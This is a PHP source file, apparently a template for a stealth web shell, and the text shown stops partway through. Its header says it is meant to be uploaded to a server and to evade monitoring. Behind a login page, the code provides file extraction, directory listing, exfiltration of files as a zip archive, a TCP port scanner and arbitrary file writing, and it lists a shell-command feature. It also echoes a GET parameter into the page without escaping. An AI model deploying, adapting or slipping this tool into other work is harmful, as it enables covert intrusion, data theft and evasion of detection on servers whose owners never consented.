<?php
/*
 * Version: 1.0.0
 * Build: 2024-04-13
 * Last change: 2024-04-13
 * Author: @Ebalo <https://github.com/ebalo55>
 * Minimum PHP version: 5.3
 * Description:
 * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
 * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
 * Everything should be as stealthy as possible, meaning that the operations should not be visible to the user or any
 * monitoring system without rising any uncommon process tree nor disk operation.
 * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
 */
session_start();

// Features name constants
define("LOGIN", "__FEAT_LOGIN__");
define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
define("FILE_EXTRACTION_PREVIEW", "__FEAT_FILE_EXTRACTION_PREVIEW__");
define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
define("EXFILTRATE", "__FEAT_EXFILTRATE__");
define("PORT_SCAN", "__FEAT_PORT_SCAN__");
define("WRITE_FILE", "__FEAT_WRITE_FILE__");
define("RUN_COMMAND", "__FEAT_RUN_COMMAND__");

define("USERNAME", "__USERNAME__");
define("PASSWORD", "__PASSWORD__");
define("SALT", "__SALT__");

/**
 * Define the enabled features
 *
 * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
 */
$ENABLED_FEATURES = array(
    FILE_EXTRACTION         => array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
    ),
    FILE_EXTRACTION_PREVIEW => array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "hidden"      => true,
    ),
    DIRECTORY_LISTING       => array(
        "title"       => "Directory listing",
        "description" => "List all files and folders in a directory and optionally its subdirectories.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
</svg>',
    ),
    EXFILTRATE              => array(
        "title"       => "Exfiltrate",
        "description" => "Exfiltrate data from the server in a password protected zip archive.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
</svg>',
    ),
    PORT_SCAN               => array(
        "title"       => "Port scan",
        "description" => "Scan a given range of TCP ports using connect method.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
</svg>',
    ),
    WRITE_FILE              => array(
        "title"       => "Write file",
        "description" => "Write a file to the given path, writing permission are required.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
    ),
    RUN_COMMAND             => array(
        "title"       => "Run command",
        "description" => "Run a system command using the default shell.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
    ),
);

date_default_timezone_set("UTC");

////////////////////////
/// UTILITY FUNCTIONS //
////////////////////////

/**
 * Check if the request method is POST
 *
 * @return bool
 */
function isPost() {
    return $_SERVER['REQUEST_METHOD'] === 'POST';
}

/**
 * Check if the checkbox is active
 *
 * @param $name string Name of the checkbox
 *
 * @return bool
 */
function isCheckboxActive($name) {
    return isset($_POST[$name]) && $_POST[$name] === "y";
}

///////////////////////
/// RENDERING BLOCK ///
///////////////////////

/**
 * Returns the classes to apply to the navigation item highlighted because it's the current page
 *
 * @param $current_page string Current page
 * @param $checking_page string Page to check if it's the current page
 *
 * @return string
 */
function htmlHighlightActivePage($current_page, $checking_page) {
    if ($current_page === $checking_page) {
        return "bg-zinc-800 text-white";
    }
    return "text-zinc-400";
}

/**
 * Create a navigation link
 *
 * @param $page string Page to link to
 * @param $current_page string Current page to highlight
 * @param $definition array{title: string, description: string, svg: string, hidden?: bool} Label to display
 *
 * @return string
 */
function makeNavLink($page, $current_page, $definition) {
    if ($definition["hidden"]) {
        return "";
    }

    ob_start();
    ?>
    <li>
        <a href="?page=<?php echo $page ?>"
           class="flex gap-x-3 rounded p-2 text-sm font-semibold leading-6
           <?php echo htmlHighlightActivePage($current_page, $page) ?>
           "
           id="nav-<?php echo $page ?>"
        >
            <div class="flex items-center justify-center">
                <?php echo $definition["svg"]; ?>
            </div>
            <?php echo $definition["title"] ?>
        </a>
    </li>
    <?php
    return ob_get_clean();
}

/**
 * Create a page header
 *
 * @param $title string Title of the page
 * @param $description string Description of the page
 *
 * @return string
 */
function makePageHeader($title, $description) {
    ob_start();
    ?>
    <div class="lg:flex lg:items-center lg:justify-between">
        <div class="min-w-0 flex-1">
            <h2 class="text-2xl font-bold leading-7 text-zinc-900 sm:truncate sm:text-3xl sm:tracking-tight">
                <?php echo $title ?>
            </h2>
            <div class="mt-1 flex flex-col sm:mt-0 sm:flex-row sm:flex-wrap sm:space-x-6">
                <div class="mt-2 flex items-center text-sm text-zinc-500">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                         stroke-width="1.5" stroke="currentColor"
                         class="mr-1.5 h-5 w-5 flex-shrink-0 text-zinc-400">
                        <path stroke-linecap="round" stroke-linejoin="round"
                              d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z"/>
                    </svg>
                    <?php echo $description ?>
                </div>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create an input field
 *
 * @param $type string Type of the input
 * @param $label string Label for the input
 * @param $name string Name of the input
 * @param $placeholder string Placeholder for the input
 * @param $description string Description of the input
 * @param $required bool Whether is the input required
 *
 * @return string
 */
function makeInput($type, $label, $name, $placeholder, $description, $required = false, $query_param = null) {
    ob_start();
    if ($type !== "textarea") {
        ?>
        <div class="flex flex-col gap-y-2">
            <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?php echo $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <input type="<?php echo $type ?>"
                   id="<?php echo $name ?>"
                   name="<?php echo $name ?>"
                   placeholder="<?php echo $placeholder ?>"
                <?php
                if ($required) {
                    echo "required ";
                }
                if ($query_param !== null) {
                    echo "value=\"" . $_GET[$query_param] . "\" ";
                }
                ?>
                   class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
            <p class="text-sm text-zinc-500">
                <?php echo $description ?>
            </p>
        </div>
        <?php
    }
    else {
        ?>
        <div class="flex flex-col gap-y-2">
            <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?php echo $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <textarea id="<?php echo $name ?>"
                      name="<?php echo $name ?>"
                      placeholder="<?php echo $placeholder ?>"
                <?php
                if ($required) {
                    echo "required";
                }
                ?>
                      class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                      rows="5"
            ></textarea>
            <p class="text-sm text-zinc-500">
                <?php echo $description ?>
            </p>
        </div>
        <?php
    }
    return ob_get_clean();
}

/**
 * Create a checkbox field
 *
 * @param $name string Name of the checkbox
 * @param $label string Label for the checkbox
 * @param $description string Description of the checkbox
 * @param $is_checked bool Whether the checkbox is checked
 * @param $value string Value of the checkbox, default is "y"
 * @param $onclick string OnClick event for the checkbox
 *
 * @return string
 */
function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
    ob_start();
    ?>
    <div class="relative flex items-start">
        <div class="flex h-6 items-center">
            <input id="<?php echo $name ?>" name="<?php echo $name ?>" type="checkbox"
                   class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
                   value="<?php echo $value ?>"
                <?php
                if ($is_checked) {
                    echo "checked ";
                }
                if ($onclick !== null) {
                    echo "onclick=\"$onclick\" ";
                }
                ?>
            >
        </div>
        <div class="ml-3 text-sm leading-6 flex flex-col select-none">
            <label for="<?php echo $name ?>" class="font-medium text-zinc-900 w-full cursor-pointer">
                <?php echo $label ?>
            </label>
            <p class="text-zinc-500 cursor-pointer" onclick="document.getElementById('<?php echo $name ?>').click()">
                <?php echo $description ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a form with the given elements
 *
 * @param $operation string Operation to perform when the form is submitted
 * @param $action string Action to perform when the form is submitted
 * @param $elements string[] Elements to include in the form
 * @param $method string Method to use for the form, default is "post"
 *
 * @return string
 */
function makeForm($operation, $action, $elements, $method = "post") {
    ob_start();
    ?>
    <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
        <input type="hidden" name="__OPERATION__" value="<?php echo $operation ?>"/>
        <?php
        foreach ($elements as $element) {
            echo $element;
        }
        ?>
        <button type="submit"
                class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
    hover:bg-zinc-700 transition-all duration-300">
            Run operation
        </button>
    </form>
    <?php
    return ob_get_clean();
}

/**
 * Create a page with the given elements
 *
 * @param $elements string[] Elements to include in the page
 * @param $current_page string Current page to highlight in the navigation
 *
 * @return string
 */
function makePage($elements, $current_page) {
    global $ENABLED_FEATURES;
    if ($_SESSION["auth"] !== true) {
        header("Location: ?page=" . LOGIN);
        die();
    }

    ob_start();
    ?>
    <html lang="en">
    <head>
        <title>__TITLE__</title>
        <style>__CSS__</style>
        <script>__JS__</script>
    </head>
    <body class="bg-white">
    <div class="fixed inset-y-0 z-50 w-72 flex flex-col">
        <div class="flex flex-grow flex-col gap-y-5 overflow-y-auto bg-zinc-900 px-6 pb-4">
            <div class="flex items-center h-16 shrink-0">
                <h1 class="text-2xl text-white">__TITLE__</h1>
            </div>
            <nav class="flex flex-1 flex-col">
                <ul role="list" class="flex flex-1 flex-col gap-y-7">
                    <li>
                        <ul role="list" class="-mx-2">
                            <?php
                            foreach ($ENABLED_FEATURES as $feature => $definition) {
                                echo makeNavLink($feature, $current_page, $definition);
                            }
                            ?>
                        </ul>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
    <div class="ml-72">
        <main class="py-10">
            <div class="container px-16">
                <?php
                foreach ($elements as $element) {
                    echo $element;
                }
                ?>
            </div>
        </main>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a login page
 *
 * @return string
 */
function makeLoginPage() {
    ob_start();
    ?>
    <html lang="en" class="h-full bg-zinc-900">
    <head>
        <title>__TITLE__</title>
        <style>__CSS__</style>
        <script>__JS__</script>
    </head>
    <body class="h-full">
    <div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
        <div class="sm:mx-auto sm:w-full sm:max-w-sm">
            <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-white">
                Sign in to your account
            </h2>
        </div>

        <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
            <form class="space-y-6" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" method="post">
                <input type="hidden" name="__OPERATION__" value="<?php echo LOGIN ?>"/>
                <div>
                    <label for="__PARAM_1__" class="block text-sm font-medium leading-6 text-white">
                        Username
                    </label>
                    <div class="mt-2">
                        <input id="__PARAM_1__" name="__PARAM_1__" type="text" autocomplete="__PARAM_1__" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="admin"
                        >
                    </div>
                </div>

                <div>
                    <div class="flex items-center justify-between">
                        <label for="__PARAM_2__" class="block text-sm font-medium leading-6 text-white">
                            Password
                        </label>
                    </div>
                    <div class="mt-2">
                        <input id="__PARAM_2__" name="__PARAM_2__" type="password" autocomplete="__PARAM_2__" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;"
                        >
                    </div>
                </div>

                <div>
                    <button type="submit"
                            class="flex w-full justify-center rounded-md bg-indigo-500 px-3 py-1.5 text-sm
                            font-semibold leading-6 text-white shadow-sm hover:bg-indigo-400 focus-visible:outline
                            focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-500">
                        Sign in
                    </button>
                </div>
            </form>
        </div>
    </div>
    </body>
    </html>
    <?php
    return ob_get_clean();
}

/**
 * Create a code highlight element
 *
 * @param $code string|int|float Code to highlight
 *
 * @return string
 */
function makeCodeHighlight($code) {
    ob_start();
    ?>
    <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
    <?php
    return ob_get_clean();
}

/**
 * Create an alert element on the page
 *
 * @param $title string Title of the alert box
 * @param $message string Message of the alert
 *
 * @return string
 */
function makeAlert($title, $message) {
    ob_start();
    ?>
    <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
        <div class="flex items-start justify-center text-yellow-600">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
                 stroke="currentColor" class="w-8 h-8">
                <path stroke-linecap="round" stroke-linejoin="round"
                      d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/>
            </svg>
        </div>
        <div class="flex flex-col">
            <h3 class="text-sm leading-7 font-semibold">
                <?php echo $title; ?>
            </h3>
            <p class="text-sm">
                <?php echo $message; ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Open the command output screen where output can be freely written
 *
 * @return void
 */
function openCommandOutputScreen()
{
    ?>
<div class="ml-72 py-10">
    <div class="container px-16">
    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-2">
    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-7">
        Command output
    </h3>
    <pre class="p-2"><?php
}

/**
 * Closes the command output screen
 *
 * @return void
 */
function closeCommandOutputScreen() {
    ?></pre>
    </div>
    </div>
    </div>
    <?php
}

/**
 * Output data to the command output screen
 *
 * @param string|array $data Data to output
 *
 * @return void
 */
function out($data) {
    if (is_array($data)) {
        $data = implode("\n", $data);
    }
    echo "$data\n";
    flush();
}

///////////////////////
// CODE BLOCK START  //
///////////////////////

/**
 * Handle the file extraction operation
 *
 * @return void
 */
function handleFileExtraction() {
    $filepath = $_POST['__PARAM_1__'];
    $preview  = strtolower($_POST['__PARAM_2__']) === "y";
    $export   = strtolower($_POST['__PARAM_3__']) === "y";

    if (!file_exists($filepath)) {
        echo "Error: File '$filepath' does not exist.\n";
        return;
    }

    $filesize = filesize($filepath);

    $export_callback = function () use ($filepath, $filesize) {
        $chunk_size = 4096; // Adjust chunk size as needed

        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream'); // Adjust content type if needed
        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
        header('Content-Transfer-Encoding: chunked');
        header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking

        $file_handle = fopen($filepath, 'rb');

        while (!feof($file_handle)) {
            $chunk = fread($file_handle, $chunk_size);
            echo $chunk;
            flush();     // Flush output buffer after sending each chunk
        }

        fclose($file_handle);
    };

    echo "Reading file '$filepath'\n";
    echo "File size: " . formatBytes($filesize) . "\n";
    if ($preview) {
        $preview_content = fopen($filepath, "r");
        $read            = fread($preview_content, 10240); // Read 10Kb
        fclose($preview_content);
        echo "Preview:\n" . htmlspecialchars($read, ENT_QUOTES, "UTF-8") . "\n";

        return;
    }

    if ($filesize < 102400) { // Less than 100Kb
        $export_callback();
    }
    elseif ($export) {
        $export_callback();
    }
}

/**
 * Handle the directory listing operation
 *
 * @return void
 */
function handleDirectoryListing() {
    $path      = $_POST['__PARAM_1__'];
    $max_depth = $_POST['__PARAM_2__'];

    listFilesRecursive($path, $max_depth);
}

/**
 * List files recursively
 *
 * @param $path string Path to list
 * @param $max_depth int Maximum depth to list
 * @param $depth int Current depth
 * @param $show_line_split bool Whether to show a line split between entries
 *
 * @return void
 */
function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true) {
    if (is_string($max_depth) && strtolower($max_depth) === "inf") {
        $max_depth = INF;
    }

    // Get stat for current path
    $stat = stat($path);

    // Print information for current path
    $perm = getPermissionsString($path);
    echo "$perm " .
         pad_right("" . $stat["nlink"], 3) .
         " " .
         pad_right("" . $stat["uid"], 5) .
         " " .
         pad_right("" . $stat["gid"], 5) .
         " " .
         formatBytes($stat["size"]) .
         " " .
         convertUnixTimestampToDate($stat["mtime"]) .
         " $path\n";

    if ($show_line_split) {
        echo "----------------\n";
    }

    // Check if path is a directory and is readable
    if (is_dir($path) && is_readable($path)) {
        // Open directory handle
        $dir_handle = opendir($path);
        // Loop through directory contents
        while (($file = readdir($dir_handle)) !== false) {
            // Ignore '.' and '..'
            if ($file !== '.' && $file !== '..') {
                $sub_path = "$path/$file";
                // Recursively list files if depth is less than max depth
                if ($depth < $max_depth) {
                    listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
                }
                else {
                    // Print information for files beyond max depth
                    $stat = stat($sub_path);
                    $perm = getPermissionsString($sub_path);
                    echo "$perm " .
                         pad_right("" . $stat["nlink"], 3) .
                         " " .
                         pad_right("" . $stat["uid"], 5) .
                         " " .
                         pad_right("" . $stat["gid"], 5) .
                         " " .
                         formatBytes($stat["size"]) .
                         " " .
                         convertUnixTimestampToDate($stat["mtime"]) .
                         " $sub_path\n";
                }
            }
        }
        // Close directory handle
        closedir($dir_handle);
    }
}

/**
 * Get the permissions string for a file or directory (unix like `ls -l` output)
 *
 * @param $path
 *
 * @return string
 */
function getPermissionsString($path) {
    if (!file_exists($path)) {
        return "----------";
    }

    $perms = fileperms($path);

    // Determine file type
    $type = '';
    if (is_dir($path)) {
        $type = 'd';
    }
    elseif (is_file($path)) {
        $type = '-';
    }

    // Owner permissions
    $owner_perms = ($perms & 0x0100) ? 'r' : '-';
    $owner_perms .= ($perms & 0x0080) ? 'w' : '-';
    $owner_perms .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');

    // Group permissions
    $group_perms = ($perms & 0x0020) ? 'r' : '-';
    $group_perms .= ($perms & 0x0010) ? 'w' : '-';
    $group_perms .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');

    // Other permissions
    $other_perms = ($perms & 0x0004) ? 'r' : '-';
    $other_perms .= ($perms & 0x0002) ? 'w' : '-';
    $other_perms .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');

    return $type . $owner_perms . $group_perms . $other_perms;
}

/**
 * Pad a string to the left with spaces
 *
 * @param $str
 * @param $pad_length
 *
 * @return mixed|string
 */
function pad_right($str, $pad_length = 10) {
    // Ensure string and pad length are valid
    if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
        return $str; // Return unmodified string for invalid input
    }

    // Calculate the number of spaces needed for padding
    $padding = max(0, $pad_length - strlen($str));

    // Pad the string with spaces using str_pad
    return str_pad($str, $pad_length, ' ', STR_PAD_RIGHT);
}

/**
 * Format bytes to human readable format
 *
 * @param $bytes
 *
 * @return string
 */
function formatBytes($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');

    $bytes = max($bytes, 0);
    $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow   = min($pow, count($units) - 1);

    // Calculate size in the chosen unit
    $bytes /= pow(1024, $pow);

    // Format with three-point precision
    return pad_right(round($bytes, 3) . ' ' . $units[$pow]);
}

/**
 * Convert a Unix timestamp to a date string
 *
 * @param $timestamp
 *
 * @return false|string
 */
function convertUnixTimestampToDate($timestamp) {
    return date('Y-m-d H:i:s', $timestamp);
}

/**
 * Get the shortest common path from a list of paths
 *
 * @param $paths
 *
 * @return string|null
 */
function getShortestCommonPath($paths) {
    if (empty($paths)) {
        return null;
    }

    $shortest_path = $paths[0]; // Initialize with first path

    foreach ($paths as $path) {
        $common_path       = '';
        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));

        $min_length = min(count($path_segments), count($shortest_segments));
        for ($i = 0; $i < $min_length; $i++) {
            if ($path_segments[$i] === $shortest_segments[$i]) {
                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
            }
            else {
                break;
            }
        }

        $shortest_path = $common_path; // Update shortest path if shorter common path found
    }

    return rtrim($shortest_path, DIRECTORY_SEPARATOR); // Remove trailing separator if present
}

/**
 * Handle the zip creation process
 *
 * @return void
 */
function handleCreateZip() {
    $content = $_POST['__PARAM_1__'];

    $zip      = new ZipArchive();
    $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");

    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        echo "Error: Could not create temporary archive.";
        return;
    }

    $lines            = explode("\n", $content);
    $path_replacement = getShortestCommonPath($lines);
    foreach ($lines as $line) {
        $parts = explode(',', trim($line)); // Split line by comma
        $path  = isset($parts[0]) ? $parts[0] : '';

        $recursive  = in_array('with_tree', $parts);
        $extensions = array();

        foreach ($parts as $part) {
            if (strpos($part, 'extension=') === 0) {
                $extensions = explode("|", strtolower(trim(substr($part, 10))));
                break;
            }
        }

        if ($path) {
            if (
                is_file($path) &&
                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
            ) {
                $zip->addFile(
                    $path,
                    str_replace(
                        $path_replacement,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($path)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            else {
                if (is_dir($path) && is_readable($path)) {
                    addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
                }
            }
        }
    }

    $zip->close();

    $file_size  = filesize($zip_name);
    $chunk_size = 4096; // Adjust chunk size as needed

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream'); // Adjust content type if needed
    header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
    header('Content-Transfer-Encoding: chunked');
    header('Content-Length: ' . $file_size); // Optional: Set content length for progress tracking

    $file_handle = fopen($zip_name, 'rb');

    while (!feof($file_handle)) {
        $chunk = fread($file_handle, $chunk_size);
        echo $chunk; // Add CRLF after each chunk
        flush();     // Flush output buffer after sending each chunk
    }

    fclose($file_handle);
    unlink($zip_name); // Delete temporary zip file;
}

/**
 * Add a directory to a zip archive
 *
 * @param $dir string Directory to add
 * @param $zip ZipArchive Zip archive to add to
 * @param $recursive bool Whether to add the directory recursively
 * @param $extensions string[] Extensions to include
 * @param $cleanup_path string Path to cleanup
 *
 * @return void
 */
function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
    $dir_handle = opendir($dir);

    while (($file = readdir($dir_handle)) !== false) {
        if ($file !== '.' && $file !== '..') {
            $sub_path = "$dir/$file";

            if (
                is_file($sub_path) &&
                ($extensions === array() || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
            ) {
                $zip->addFile(
                    $sub_path,
                    str_replace(
                        $cleanup_path,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($sub_path)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                ); // Add with relative path within zip
            }
            else {
                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
                    addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                }
            }
        }
    }

    closedir($dir_handle);
}

/**
 * Handle the port scan operation
 *
 * @return void
 */
function handlePortScan() {
    $host      = $_POST['__PARAM_1__'];
    $startPort = intval($_POST['__PARAM_2__']);
    $endPort   = intval($_POST['__PARAM_3__']);

    out("Scanning ports $startPort to $endPort on $host...");

    // Loop through the port range
    for ($port = $startPort; $port <= $endPort; $port++) {
        // Attempt to connect to the host on the current port
        $socket = @fsockopen($host, $port, $errno, $errstr, 1);

        // Check if the connection was successful
        if ($socket) {
            // The port is open
            fclose($socket);
            out("Port $port: OPEN");
        }
        else {
            // The port is closed or unreachable
            out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
        }
        flush();
    }
}

/**
 * Handle the write file operation
 *
 * @return void
 */
function handleWriteFile() {
    $filename               = $_POST['__PARAM_1__'];
    $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
    $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];

    out(
        array(
            "Received content of length " . strlen($content) . " bytes.",
            "Writing to $filename ...",
        )
    );

    file_put_contents($filename, $content);
    out("File written successfully.");
}

/**
 * Handle the login operation
 * @return void
 */
function handleLogin() {
    $username = hash("sha512", $_POST["__PARAM_1__"] . SALT);
    $password = hash("sha512", $_POST["__PARAM_2__"] . SALT);

    if ($username === USERNAME && $password === PASSWORD) {
        $_SESSION["auth"] = true;
        header("Location: ?page=" . FILE_EXTRACTION);
        die();
    }
}

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$isolated_ops = array(
    FILE_EXTRACTION,
    EXFILTRATE,
);

// Check if the request is not POST and the operation is not in the isolated operations list, then render the page
if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
    $page = isset($_GET['page']) ? $_GET['page'] : LOGIN;

    $content = "";

    switch ($page) {
        case LOGIN:
            $content = makeLoginPage();
            break;
        case FILE_EXTRACTION_PREVIEW:
        case FILE_EXTRACTION:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/file.txt",
                                "Fully qualified path to the file to extract.",
                                true,
                                "__PARAM_99__"
                            ),
                            makeCheckbox(
                                "__PARAM_2__",
                                "Preview",
                                "Display preview of the file content if it's larger than 100kb.",
                                $page === FILE_EXTRACTION_PREVIEW,
                                "y",
